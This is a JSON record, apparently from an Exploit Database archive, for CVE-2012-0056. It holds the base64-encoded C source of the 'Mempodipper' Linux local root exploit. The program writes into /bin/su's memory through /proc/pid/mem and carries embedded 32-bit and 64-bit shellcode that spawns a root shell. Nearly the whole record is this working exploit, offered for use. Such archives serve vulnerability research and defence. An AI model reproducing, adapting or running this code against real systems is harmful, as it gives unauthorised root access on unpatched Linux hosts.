{
    "source": "exploit-database", 
    "exploit": "LyoNCkV4cGxvaXQgY29kZSBpcyBoZXJlOiBodHRwOi8vZ2l0Lnp4MmM0LmNvbS9DVkUtMjAxMi0wMDU2L3BsYWluL21lbXBvZGlwcGVyLmMNCkJsb2cgcG9zdCBhYm91dCBpdCBpcyBoZXJlOiBodHRwOi8vYmxvZy56eDJjNC5jb20vNzQ5DQpFREItTm90ZTogVXBkYXRlZCB2ZXJzaW9uIGNhbiBiZSBmb3VuZCBoZXJlOiBodHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8zNTE2MS8NCg0KIyBFeHBsb2l0IFRpdGxlOiBNZW1wb2RpcHBlciAtIExpbnV4IExvY2FsIFJvb3QgZm9yID49Mi42LjM5LCAzMi1iaXQgYW5kIDY0LWJpdA0KIyBEYXRlOiBKYW4gMjEsIDIwMTINCiMgQXV0aG9yOiB6eDJjNA0KIyBUZXN0ZWQgb246IEdlbnRvbywgVWJ1bnR1DQojIFBsYXRmb3JtOiBMaW51eA0KIyBDYXRlZ29yeTogTG9jYWwNCiMgQ1ZFLTIwMTItMDA1Ng0KDQoNCiAqIE1lbXBvZGlwcGVyDQogKiBieSB6eDJjNA0KICogDQogKiBMaW51eCBMb2NhbCBSb290IEV4cGxvaXQNCiAqIA0KICogUmF0aGVyIHRoYW4gcHV0IG15IHdyaXRlIHVwIGhlcmUsIHBlciB1c3VhbCwgdGhpcyB0aW1lIEkndmUgcHV0IGl0DQogKiBpbiBhIHJhdGhlciBsZW5ndGh5IGJsb2cgcG9zdDogaHR0cDovL2Jsb2cuengyYzQuY29tLzc0OQ0KICogDQogKiBFbmpveS4NCiAqIA0KICogLSB6eDJjNA0KICogSmFuIDIxLCAyMDEyDQogKiANCiAqIENWRS0yMDEyLTAwNTYNCiAqLw0KDQojZGVmaW5lIF9MQVJHRUZJTEU2NF9TT1VSQ0UgDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvdW4uaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGxpbWl0cy5oPg0KDQpjaGFyICpzb2NrZXRfcGF0aCA9ICIvdG1wLy5zb2NrcHVwcGV0IjsNCmludCBzZW5kX2ZkKGludCBmZCkNCnsNCgljaGFyIGJ1ZlsxXTsNCglzdHJ1Y3QgaW92ZWMgaW92Ow0KCXN0cnVjdCBtc2doZHIgbXNnOw0KCXN0cnVjdCBjbXNnaGRyICpjbXNnOw0KCXN0cnVjdCBzb2NrYWRkcl91biBhZGRyOw0KCWludCBuOw0KCWludCBzb2NrOw0KCWNoYXIgY21zW0NNU0dfU1BBQ0Uoc2l6ZW9mKGludCkpXTsNCgkNCglpZiAoKHNvY2sgPSBzb2NrZXQoQUZfVU5JWCwgU09DS19TVFJFQU0sIDApKSA8IDApDQoJCXJldHVybiAtMTsNCgltZW1zZXQoJmFkZHIsIDAsIHNpemVvZihhZGRyKSk7DQoJYWRkci5zdW5fZmFtaWx5ID0gQUZfVU5JWDsNCglzdHJuY3B5KGFkZHIuc3VuX3BhdGgsIHNvY2tldF9wYXRoLCBzaXplb2YoYWRkci5zdW5fcGF0aCkgLSAxKTsNCglpZiAoY29ubmVjdChzb2NrLCAoc3RydWN0IHNvY2thZGRyKikmYWRkciwgc2l6ZW9mKGFkZHIpKSA8IDApDQoJCXJldHVybiAtMTsNCg0KCWJ1ZlswXSA9IDA7DQoJaW92Lmlvdl9iYXNlID0gYnVmOw0KCWlvdi5pb3ZfbGVuID0gMTsNCg0KCW1lbXNldCgmbXNnLCAwLCBzaXplb2YgbXNnKTsNCgltc2cubXNnX2lvdiA9ICZpb3Y7DQoJbXNnLm1zZ19pb3ZsZW4gPSAxOw0KCW1zZy5tc2dfY29udHJvbCA9IChjYWRkcl90KWNtczsNCgltc2cubXNnX2NvbnRyb2xsZW4gPSBDTVNHX0xFTihzaXplb2YoaW50KSk7DQoNCgljbXNnID0gQ01TR19GSVJTVEhEUigmbXNnKTsNCgljbXNnLT5jbXNnX2xlbiA9IENNU0dfTEVOKHNpemVvZihpbnQpKTsNCgljbXNnLT5jbXNnX2xldmVsID0gU09MX1NPQ0tFVDsNCgljbXNnLT5jbXNnX3R5cGUgPSBTQ01fUklHSFRTOw0KCW1lbW1vdmUoQ01TR19EQVRBKGNtc2cpLCAmZmQsIHNpemVvZihpbnQpKTsNCg0KCWlmICgobiA9IHNlbmRtc2coc29jaywgJm1zZywgMCkpICE9IGlvdi5pb3ZfbGVuKQ0KCQlyZXR1cm4gLTE7DQoJY2xvc2Uoc29jayk7DQoJcmV0dXJuIDA7DQp9DQoNCmludCByZWN2X2ZkKCkNCnsNCglpbnQgbGlzdGVuZXI7DQoJaW50IHNvY2s7DQoJaW50IG47DQoJaW50IGZkOw0KCWNoYXIgYnVmWzFdOw0KCXN0cnVjdCBpb3ZlYyBpb3Y7DQoJc3RydWN0IG1zZ2hkciBtc2c7DQoJc3RydWN0IGNtc2doZHIgKmNtc2c7DQoJc3RydWN0IHNvY2thZGRyX3VuIGFkZHI7DQoJY2hhciBjbXNbQ01TR19TUEFDRShzaXplb2YoaW50KSldOw0KDQoJaWYgKChsaXN0ZW5lciA9IHNvY2tldChBRl9VTklYLCBTT0NLX1NUUkVBTSwgMCkpIDwgMCkNCgkJcmV0dXJuIC0xOw0KCW1lbXNldCgmYWRkciwgMCwgc2l6ZW9mKGFkZHIpKTsNCglhZGRyLnN1bl9mYW1pbHkgPSBBRl9VTklYOw0KCXN0cm5jcHkoYWRkci5zdW5fcGF0aCwgc29ja2V0X3BhdGgsIHNpemVvZihhZGRyLnN1bl9wYXRoKSAtIDEpOw0KCXVubGluayhzb2NrZXRfcGF0aCk7DQoJaWYgKGJpbmQobGlzdGVuZXIsIChzdHJ1Y3Qgc29ja2FkZHIqKSZhZGRyLCBzaXplb2YoYWRkcikpIDwgMCkNCgkJcmV0dXJuIC0xOw0KCWlmIChsaXN0ZW4obGlzdGVuZXIsIDEpIDwgMCkNCgkJcmV0dXJuIC0xOw0KCWlmICgoc29jayA9IGFjY2VwdChsaXN0ZW5lciwgTlVMTCwgTlVMTCkpIDwgMCkNCgkJcmV0dXJuIC0xOw0KCQ0KCWlvdi5pb3ZfYmFzZSA9IGJ1ZjsNCglpb3YuaW92X2xlbiA9IDE7DQoNCgltZW1zZXQoJm1zZywgMCwgc2l6ZW9mIG1zZyk7DQoJbXNnLm1zZ19uYW1lID0gMDsNCgltc2cubXNnX25hbWVsZW4gPSAwOw0KCW1zZy5tc2dfaW92ID0gJmlvdjsNCgltc2cubXNnX2lvdmxlbiA9IDE7DQoNCgltc2cubXNnX2NvbnRyb2wgPSAoY2FkZHJfdCljbXM7DQoJbXNnLm1zZ19jb250cm9sbGVuID0gc2l6ZW9mIGNtczsNCg0KCWlmICgobiA9IHJlY3Ztc2coc29jaywgJm1zZywgMCkpIDwgMCkNCgkJcmV0dXJuIC0xOw0KCWlmIChuID09IDApDQoJCXJldHVybiAtMTsNCgljbXNnID0gQ01TR19GSVJTVEhEUigmbXNnKTsNCgltZW1tb3ZlKCZmZCwgQ01TR19EQVRBKGNtc2cpLCBzaXplb2YoaW50KSk7DQoJY2xvc2Uoc29jayk7DQoJY2xvc2UobGlzdGVuZXIpOw0KCXJldHVybiBmZDsNCn0NCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQ0Kew0KCWlmIChhcmdjID4gMiAmJiBhcmd2WzFdWzBdID09ICctJyAmJiBhcmd2WzFdWzFdID09ICdjJykgew0KCQljaGFyIHBhcmVudF9tZW1bMjU2XTsNCgkJc3ByaW50ZihwYXJlbnRfbWVtLCAiL3Byb2MvJXMvbWVtIiwgYXJndlsyXSk7DQoJCXByaW50ZigiWytdIE9wZW5pbmcgcGFyZW50IG1lbSAlcyBpbiBjaGlsZC5cbiIsIHBhcmVudF9tZW0pOw0KCQlpbnQgZmQgPSBvcGVuKHBhcmVudF9tZW0sIE9fUkRXUik7DQoJCWlmIChmZCA8IDApIHsNCgkJCXBlcnJvcigiWy1dIG9wZW4iKTsNCgkJCXJldHVybiAxOw0KCQl9DQoJCXByaW50ZigiWytdIFNlbmRpbmcgZmQgJWQgdG8gcGFyZW50LlxuIiwgZmQpOw0KCQlzZW5kX2ZkKGZkKTsNCgkJcmV0dXJuIDA7DQoJfQ0KCQ0KCXByaW50ZigiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuIik7DQoJcHJpbnRmKCI9ICAgICAgICAgIE1lbXBvZGlwcGVyICAgICAgICA9XG4iKTsNCglwcmludGYoIj0gICAgICAgICAgIGJ5IHp4MmM0ICAgICAgICAgID1cbiIpOw0KCXByaW50ZigiPSAgICAgICAgIEphbiAyMSwgMjAxMiAgICAgICAgPVxuIik7DQoJcHJpbnRmKCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG5cbiIpOw0KCQ0KCWludCBwYXJlbnRfcGlkID0gZ2V0cGlkKCk7DQoJaWYgKGZvcmsoKSkgew0KCQlwcmludGYoIlsrXSBXYWl0aW5nIGZvciB0cmFuc2ZlcnJlZCBmZCBpbiBwYXJlbnQuXG4iKTsNCgkJaW50IGZkID0gcmVjdl9mZCgpOw0KCQlwcmludGYoIlsrXSBSZWNlaXZlZCBmZCBhdCAlZC5cbiIsIGZkKTsNCgkJaWYgKGZkIDwgMCkgew0KCQkJcGVycm9yKCJbLV0gcmVjdl9mZCIpOw0KCQkJcmV0dXJuIC0xOw0KCQl9DQoJCXByaW50ZigiWytdIEFzc2lnbmluZyBmZCAlZCB0byBzdGRlcnIuXG4iLCBmZCk7DQoJCWR1cDIoMiwgNik7DQoJCWR1cDIoZmQsIDIpOw0KDQoJCXVuc2lnbmVkIGxvbmcgYWRkcmVzczsNCgkJaWYgKGFyZ2MgPiAyICYmIGFyZ3ZbMV1bMF0gPT0gJy0nICYmIGFyZ3ZbMV1bMV0gPT0gJ28nKQ0KCQkJYWRkcmVzcyA9IHN0cnRvdWwoYXJndlsyXSwgTlVMTCwgMTYpOw0KCQllbHNlIHsNCgkJCXByaW50ZigiWytdIFJlYWRpbmcgc3UgZm9yIGV4aXRAcGx0LlxuIik7DQoJCQkvLyBQb29yIG1hbidzIGF1dG8tZGV0ZWN0aW9uLiBEbyB0aGlzIGluIG1lbW9yeSBpbnN0ZWFkIG9mIHJlbHlpbmcgb24gb2JqZHVtcCBiZWluZyBpbnN0YWxsZWQuDQoJCQlGSUxFICpjb21tYW5kID0gcG9wZW4oIm9iamR1bXAgLWQgL2Jpbi9zdXxncmVwICdleGl0QHBsdCd8aGVhZCAtbiAxfGN1dCAtZCAnICcgLWYgMXxzZWQgJ3MvXlswXSpcXChbXjBdKlxcKS8weFxcMS8nIiwgInIiKTsNCgkJCWNoYXIgcmVzdWx0WzMyXTsNCgkJCXJlc3VsdFswXSA9IDA7DQoJCQlmZ2V0cyhyZXN1bHQsIDMyLCBjb21tYW5kKTsNCgkJCXBjbG9zZShjb21tYW5kKTsNCgkJCWFkZHJlc3MgPSBzdHJ0b3VsKHJlc3VsdCwgTlVMTCwgMTYpOw0KCQkJaWYgKGFkZHJlc3MgPT0gVUxPTkdfTUFYIHx8ICFhZGRyZXNzKSB7DQoJCQkJcHJpbnRmKCJbLV0gQ291bGQgbm90IHJlc29sdmUgL2Jpbi9zdS4gU3BlY2lmeSB0aGUgZXhpdEBwbHQgZnVuY3Rpb24gYWRkcmVzcyBtYW51YWxseS5cbiIpOw0KCQkJCXByaW50ZigiWy1dIFVzYWdlOiAlcyAtbyBBRERSRVNTXG5bLV0gRXhhbXBsZTogJXMgLW8gMHg0MDIxNzhcbiIsIGFyZ3ZbMF0sIGFyZ3ZbMF0pOw0KCQkJCXJldHVybiAxOw0KCQkJfQ0KCQkJcHJpbnRmKCJbK10gUmVzb2x2ZWQgZXhpdEBwbHQgdG8gMHglbHguXG4iLCBhZGRyZXNzKTsNCgkJfQ0KCQlwcmludGYoIlsrXSBDYWxjdWxhdGluZyBzdSBwYWRkaW5nLlxuIik7DQoJCUZJTEUgKmNvbW1hbmQgPSBwb3Blbigic3UgdGhpcy11c2VyLWRvZXMtbm90LWV4aXN0IDI+JjEiLCAiciIpOw0KCQljaGFyIHJlc3VsdFsyNTZdOw0KCQlyZXN1bHRbMF0gPSAwOw0KCQlmZ2V0cyhyZXN1bHQsIDI1NiwgY29tbWFuZCk7DQoJCXBjbG9zZShjb21tYW5kKTsNCgkJdW5zaWduZWQgbG9uZyBzdV9wYWRkaW5nID0gKHN0cnN0cihyZXN1bHQsICJ0aGlzLXVzZXItZG9lcy1ub3QtZXhpc3QiKSAtIHJlc3VsdCkgLyBzaXplb2YoY2hhcik7DQoJCXVuc2lnbmVkIGxvbmcgb2Zmc2V0ID0gYWRkcmVzcyAtIHN1X3BhZGRpbmc7DQoJCXByaW50ZigiWytdIFNlZWtpbmcgdG8gb2Zmc2V0IDB4JWx4LlxuIiwgb2Zmc2V0KTsNCgkJbHNlZWs2NChmZCwgb2Zmc2V0LCBTRUVLX1NFVCk7DQoJCQ0KI2lmIGRlZmluZWQoX19pMzg2X18pDQoJCS8vIFNlZSBzaGVsbGNvZGUtMzIucyBpbiB0aGlzIHBhY2thZ2UgZm9yIHRoZSBzb3VyY2UuDQoJCWNoYXIgc2hlbGxjb2RlW10gPQ0KCQkJIlx4MzFceGRiXHhiMFx4MTdceGNkXHg4MFx4MzFceGRiXHhiMFx4MmVceGNkXHg4MFx4MzFceGM5XHhiMyINCgkJCSJceDA2XHhiMVx4MDJceGIwXHgzZlx4Y2RceDgwXHgzMVx4YzBceDUwXHg2OFx4NmVceDJmXHg3M1x4NjgiDQoJCQkiXHg2OFx4MmZceDJmXHg2Mlx4NjlceDg5XHhlM1x4MzFceGQyXHg2Nlx4YmFceDJkXHg2OVx4NTJceDg5Ig0KCQkJIlx4ZTBceDMxXHhkMlx4NTJceDUwXHg1M1x4ODlceGUxXHgzMVx4ZDJceDMxXHhjMFx4YjBceDBiXHhjZCINCgkJCSJceDgwIjsNCiNlbGlmIGRlZmluZWQoX194ODZfNjRfXykNCgkJLy8gU2VlIHNoZWxsY29kZS02NC5zIGluIHRoaXMgcGFja2FnZSBmb3IgdGhlIHNvdXJjZS4NCgkJY2hhciBzaGVsbGNvZGVbXSA9DQoJCQkiXHg0OFx4MzFceGZmXHhiMFx4NjlceDBmXHgwNVx4NDhceDMxXHhmZlx4YjBceDZhXHgwZlx4MDVceDQwIg0KCQkJIlx4YjdceDA2XHg0MFx4YjZceDAyXHhiMFx4MjFceDBmXHgwNVx4NDhceGJiXHgyZlx4MmZceDYyXHg2OSINCgkJCSJceDZlXHgyZlx4NzNceDY4XHg0OFx4YzFceGViXHgwOFx4NTNceDQ4XHg4OVx4ZTdceDQ4XHgzMVx4ZGIiDQoJCQkiXHg2Nlx4YmJceDJkXHg2OVx4NTNceDQ4XHg4OVx4ZTFceDQ4XHgzMVx4YzBceDUwXHg1MVx4NTdceDQ4Ig0KCQkJIlx4ODlceGU2XHg0OFx4MzFceGQyXHhiMFx4M2JceDBmXHgwNSI7DQoNCiNlbHNlDQojZXJyb3IgIlRoYXQgcGxhdGZvcm0gaXMgbm90IHN1cHBvcnRlZC4iDQojZW5kaWYNCgkJcHJpbnRmKCJbK10gRXhlY3V0aW5nIHN1IHdpdGggc2hlbGxjb2RlLlxuIik7DQoJCWV4ZWNsKCIvYmluL3N1IiwgInN1Iiwgc2hlbGxjb2RlLCBOVUxMKTsNCgl9IGVsc2Ugew0KCQljaGFyIHBpZFszMl07DQoJCXNwcmludGYocGlkLCAiJWQiLCBwYXJlbnRfcGlkKTsNCgkJcHJpbnRmKCJbK10gRXhlY3V0aW5nIGNoaWxkIGZyb20gY2hpbGQgZm9yay5cbiIpOw0KCQlleGVjbCgiL3Byb2Mvc2VsZi9leGUiLCBhcmd2WzBdLCAiLWMiLCBwaWQsIE5VTEwpOw0KCX0NCn0=", 
    "filename": "platforms/linux/local/18411.c", 
    "id": "18411", 
    "cves": [
        "CVE-2012-0056"
    ]
}